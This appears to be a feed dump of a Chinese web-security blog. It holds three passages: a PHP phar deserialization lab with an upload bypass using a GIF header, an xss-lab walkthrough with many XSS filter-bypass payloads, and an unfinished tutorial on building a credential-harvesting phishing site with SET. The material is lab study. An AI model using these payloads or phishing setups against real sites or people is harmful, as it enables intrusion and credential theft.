class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">heello</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;echo &quot;heello!&quot;;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;output);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_exists(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地构造phar文件并上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">heello</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> heello();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808232024.png"></p><p>可以看到成功命令执行：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808232034.png"></p><p>这里虽然没有<code>unserialize()</code>执行反序列化，但可以结合<code>file_exists()</code>函数在通过<code>phar://</code>伪协议解析phar文件时，会将meta-data进行反序列化，进而触发<code>__destruct()</code>函数，利用<code>eval()</code>函数达到命令执行。</p><h3 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h3><p>在进行文件上传时可能会遇到文件名后缀，以及文件内容检测。而php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">heello</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> heello();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样给文件加了一个gif的头</p><p>然后对生成的phar文件改名123.gif</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808232043.png"></p><p>这样在上传的时候就可以绕过大部分的上传验证</p><p>上传完后触发漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210808232050.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>利用条件：</p><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><blockquote><p><a href="https://www.wawyw.top/posts/46951.html">https://www.wawyw.top/posts/46951.html</a></p><p><a href="https://www.freebuf.com/column/198945.html">https://www.freebuf.com/column/198945.html</a></p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><p><a href="https://cloud.tencent.com/developer/article/1485821">https://cloud.tencent.com/developer/article/1485821</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-lab通关笔记</title>
      <link href="/2021/08/03/xss-lab/"/>
      <url>/2021/08/03/xss-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h1><blockquote><p><strong>测试payload：&lt;script “ ‘ OOnn/&gt;</strong></p></blockquote><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112350.png"></p><p>发现参数name的值被回显到了屏幕上，尝试是否name处存在xss</p><p> <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112356.png"></p><p>成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112401.png"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>当我们输入test后，返回的网页源码看到后端将test赋给了input的属性</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112406.png"></p><p>构造payload闭合input标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=alert(&#x27;xss&#x27;) autofocus //</span><br></pre></td></tr></table></figure><p>成功弹窗</p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>输入test并回显，尝试输入框有无xss</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112444.png"></p><p>输入框输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>发现并没有弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112454.png"></p><p>查看页面源代码发现，我们输入的内容在后端进行了htmlspecialchars()处理，尖括号被编码了</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113516.png"></p><p>所以我们不能自己构造js语句，而是要借助本来就有尖括号来执行我们的js，现在有两处我们可以插入，<code>&lt;h2&gt;</code>不太好利用，而input标签我们可以用onclick属性</p><p>搜索框输入’ onclick=’alert(/xss/)来构造input标签的闭合</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112505.png"></p><p>发现input标签成功闭合，此时我们只需要点击搜索框就可以出发xss</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112509.png"></p><p>或者还有如下payload，//是为了注释掉后面的单引号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; οnfοcus=alert(/XSS/) autofocus //</span></span><br></pre></td></tr></table></figure><p>源码：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112536.png"></p><blockquote><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul><p><strong>即把这些字符变的没有意义，其只是普通字符，浏览器不会去解析</strong></p></blockquote><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>输入test返回test典型的反射型xss</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112555.png"></p><p>先输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>看一下效果</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112627.png"></p><p>可见第一处肯定是对参数进行了htmlspecialchars()处理，第二处应该是通过了strplace（不管是str_replace还是preg_replace）处理</p><p>那么依然采用的三关的方法，闭合input</p><p>搜索框输入：” οnfοcus=alert(/XSS/) autofocus //</p><p>成功弹窗</p><p><strong>源代码</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112640.png"></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>标准的反射型xss</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; //</span><br></pre></td></tr></table></figure><p>网页源码可以看到，给我在script中间加了个横线，猜测后端可能是用strplace匹配到script字符然后替换为scr_ipt</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112648.png"></p><p>既然匹配script标签，那就尝试使用img标签试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt; //</span><br></pre></td></tr></table></figure><p>发现也匹配了并且给我加了横线</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112656.png"></p><p>既然这样，猜测其他标签也差不多应该也都匹配了，那就尝试payload变形中的编码绕过，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;A hREF=&quot;j&amp;#97;v&amp;#x61;script:alert(/XSS/)&quot;&gt;click me !&lt;/a&gt; //</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112701.png"></p><p>且页面出现clikeme超链接，点击后成功触发xss</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112707.png"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112712.png"></p><p>源码</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112716.png"></p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>payload同第五关就能过关</p><p>源代码中看只是增加几种过滤</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112721.png"></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>典型的反射型xss</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112726.png"></p><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/XSS/)&quot;&gt;click me!&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;img  src=1  οnerrοr=alert(&quot;hack&quot;)&gt;//</span><br><span class="line">&quot; οnfοcus=alert(/XSS/) autofocus //</span><br></pre></td></tr></table></figure><p><strong>发现script，on，href，src被过滤掉了</strong></p><p><strong>这样使得绝大多数payload不能用</strong></p><p><strong>那就试试payload的变形</strong></p><p>大小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&quot;&lt;Img sRc=&#x27;#&#x27; Onerror=&quot;alert(/XSS/)&quot; /&gt; //</span><br></pre></td></tr></table></figure><p>还是给我过滤掉了src</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112733.png"></p><p>双写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(&#x27;XSS&#x27;)&lt;/scrscriptipt&gt; //</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112738.png"></p><p>源码：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112742.png"></p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>输入test后，test会被写入a标签的href属性</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112749.png"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112753.png"></p><p>尝试输入javascript:alert(/XSS/)</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112759.png"></p><p>发现给我加了横线，猜测后端用了str_replace</p><p>尝试编码绕过，p的十进制编码为&amp;#112 ;</p><p>那么输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#112;t:alert(/XSS/)</span><br></pre></td></tr></table></figure><p>就可以绕过过滤且成功xss</p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>输入test，前端页面源码显示非法地址</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112808.png"></p><p>寻思可能是后端检查输入参数是否包含http://字符串</p><p>输入http://，查看源码发现返回正常</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112813.png"></p><p>我们又想构造如下a标签，而我们的输入必须包含http://，怎么办：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(/XSS/)&quot;&gt;click me!&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>可以使用html的注释</strong></p><p>即输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/XSS/)/*http://*/</span><br></pre></td></tr></table></figure><p>输入后发现对script进行了替换</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113101.png"></p><p>那我们进行编码，输入如下即可绕过str_replace()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#112;t:alert(/XSS/)/*http://*/</span><br></pre></td></tr></table></figure><p>成功xss</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113106.png"></p><p>源码：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113110.png"></p><blockquote><p><strong>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</strong></p></blockquote><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>输入测试代码&lt;script “ ‘ OOnn&gt;</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113117.png"></p><p>查看前端源码发现后端对输入参数经过了htmlspeicalchars()以及str_replace()处理，所以keywords参数没有xss注入点</p><p>仔细观察源码发现有三个隐藏表单</p><p>尝试给这三个参数赋值：</p><p><a href="http://192.168.253.128/xss/level10.php?keyword=qqq&amp;t_link=1&amp;t_history=2&amp;t_sort=3">http://192.168.253.128/xss/level10.php?keyword=qqq&amp;t_link=1&amp;t_history=2&amp;t_sort=3</a></p><p>返回结果：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113123.png"></p><p>可以看到3被输出回来了，尝试该处是否有xss</p><p>构造：</p><p><a href="http://192.168.253.128/xss/level10.php?keyword=qqq&amp;t_sort=&quot;">http://192.168.253.128/xss/level10.php?keyword=qqq&amp;t_sort=&quot;</a> type=”button” onclick=”alert(/xss/)</p><p>页面出现一个按钮</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113128.png"></p><p>点击即成功触发xss并通关</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113132.png"></p><p>源码：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113151.png"></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>查看网页源码，发现第20行有个隐藏表单，盲猜后端应该是将$server[“useragent”]输入到input表单然后发送给客户端</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113202.png"></p><p>那么尝试抓包修改useragent</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113206.png"></p><p>返回如下</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113210.png"></p><p>发现成功修改，那么尝试构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; οnclick=&quot;alert(/XSS/)&quot;&gt;</span><br></pre></td></tr></table></figure><p>抓包修改</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113214.png"></p><p>返回页面，发现成功构造</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113218.png"></p><p>点击页面的按钮即可弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113225.png"></p><p>源码：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113242.png"></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p>查看网页源码，如出一辙，后端把cookie输出到了前端</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113307.png"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113312.png"></p><p>抓包修改cookie，看看后端给我们限制了哪些字符</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113315.png"></p><p>发现过滤了尖括号</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113325.png"></p><p>但这并不影响我们构造input闭合</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113328.png"></p><p>成功闭合</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113333.png"></p><p>按下页面按钮即可弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113337.png"></p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>首先输入测试payload</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113343.png"></p><p>返回的网页源码可以看到给我们将空格以及script以及/都变为了&amp;nbsp ;即空格</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113346.png"></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113350.png"></p><p><strong>script标签被过滤我们可以用其他标签，/被过滤那我就不用带有反斜杠的标签比如img标签</strong></p><p><strong>空格被过滤，那就用%0a代替空格</strong></p><p>构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0asrc=1%0aonerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p>源码：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803113354.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一般的当我们的输入回显到我们的页面上时，都可能存在xss注入点，我们首先找到这些可能存在注入的地方比如搜索框或者请求参数，然后输入顶部的测试代码通过返回的网页源码看看后端是否对这些敏感字符进行了过滤，然后针对不同的过滤构造不同的payload进行注入</p><p>注意要对htmlspecialchars()，str_replace()，preg_replace()，strpos()很熟悉</p><blockquote><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332">https://blog.csdn.net/wo41ge/article/details/107459332</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> xss </tag>
            
            <tag> xss-lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>制作一个钓鱼网站</title>
      <link href="/2021/08/03/%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/"/>
      <url>/2021/08/03/%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼网站制作"><a href="#钓鱼网站制作" class="headerlink" title="钓鱼网站制作"></a>钓鱼网站制作</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>钓鱼网站通常是指伪装成银行及电子商务等网站，主要危害是窃取用户提交的银行帐号、密码等私密信息。所谓“钓鱼网站”是一种网络欺诈行为，指不法分子利用各种手段，仿冒真实网站的URL地址以及页面内容，或者利用真实网站服务器程序上的漏洞在站点的某些网页中插入危险的HTML代码，以此来骗取用户银行或信用卡账号、密码等私人资料。恶意团购网站或购物网站，假借“限时抢购”、“秒杀”等噱头，让用户不假思索地提供个人信息和银行账号，这些黑心网站主可直接获取用户输入的个人资料和网银账号密码信息，进而获利。</p><h2 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h2><p><strong>利用kali的SET工具</strong></p><p>输入setoolkit启动SET工具</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112005.png"></p><p>启动后，可以看到有如下选项可以选择</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   1) Social-Engineering Attacks         <span class="comment"># 社会工程攻击</span></span><br><span class="line">   2) Penetration Testing (Fast-Track)   <span class="comment"># 渗透测试（快速通道）</span></span><br><span class="line">   3) Third Party Modules                <span class="comment"># 第三方模块</span></span><br><span class="line">   4) Update the Social-Engineer Toolkit <span class="comment"># 更新 SET</span></span><br><span class="line">   5) Update SET configuration           <span class="comment"># 更新 SET 配置</span></span><br><span class="line">   6) Help, Credits, and About           <span class="comment"># 帮助</span></span><br><span class="line"></span><br><span class="line">  99) Exit the Social-Engineer Toolkit   <span class="comment"># 退出</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br></pre></td></tr></table></figure><p>选择1，然后看到如下界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   1) Spear-Phishing Attack Vectors        <span class="comment"># 鱼叉式网络钓鱼攻击</span></span><br><span class="line">   2) Website Attack Vectors               <span class="comment"># 网站攻击</span></span><br><span class="line">   3) Infectious Media Generator           <span class="comment"># 感染性介质生成</span></span><br><span class="line">   4) Create a Payload and Listener        <span class="comment"># 创建 Payload 和 监听器</span></span><br><span class="line">   5) Mass Mailer Attack                   <span class="comment"># 群发邮件</span></span><br><span class="line">   6) Arduino-Based Attack Vector          <span class="comment"># 基于 Arduino 的攻击</span></span><br><span class="line">   7) Wireless Access Point Attack Vector  <span class="comment"># 无线接入点攻击</span></span><br><span class="line">   8) QRCode Generator Attack Vector       <span class="comment"># 二维码生成器攻击</span></span><br><span class="line">   9) Powershell Attack Vectors            <span class="comment"># Powershell 攻击</span></span><br><span class="line">  10) Third Party Modules                  <span class="comment"># 第三方模块</span></span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.        <span class="comment"># 返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 2</span><br></pre></td></tr></table></figure><p>选择2，可以看到如下界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1) Java Applet Attack Method           <span class="comment"># Java Applet 攻击</span></span><br><span class="line">2) Metasploit Browser Exploit Method   <span class="comment"># Metasploit Browser 浏览器攻击</span></span><br><span class="line">3) Credential Harvester Attack Method  <span class="comment"># 凭证窃取攻击</span></span><br><span class="line">4) Tabnabbing Attack Method            <span class="comment"># 标签页劫持       </span></span><br><span class="line">5) Web Jacking Attack Method           <span class="comment"># 网页劫持攻击</span></span><br><span class="line">6) Multi-Attack Web Method             <span class="comment"># 综合网页攻击</span></span><br><span class="line">7) HTA Attack Method                   <span class="comment"># HTA 攻击</span></span><br><span class="line"></span><br><span class="line">99) Return to Main Menu                 <span class="comment"># 返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt; 3</span><br></pre></td></tr></table></figure><p>选择3，进入如下菜单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1) Web Templates       <span class="comment"># 网站模板</span></span><br><span class="line">2) Site Cloner         <span class="comment"># 站点克隆</span></span><br><span class="line">3) Custom Import       <span class="comment"># 自定义导入</span></span><br><span class="line"></span><br><span class="line">99) Return to Webattack Menu <span class="comment"># 返回主菜单</span></span><br></pre></td></tr></table></figure><p>1）是预定义的模板，有google还有twitter的</p><p>2）是克隆网站的页面</p><p>3）使用自己写的页面</p><p>我们选择1</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112014.png"></p><p>这里意思让我们将192.168.253.180即本地做为钓鱼网站服务器，按回车</p><p><img 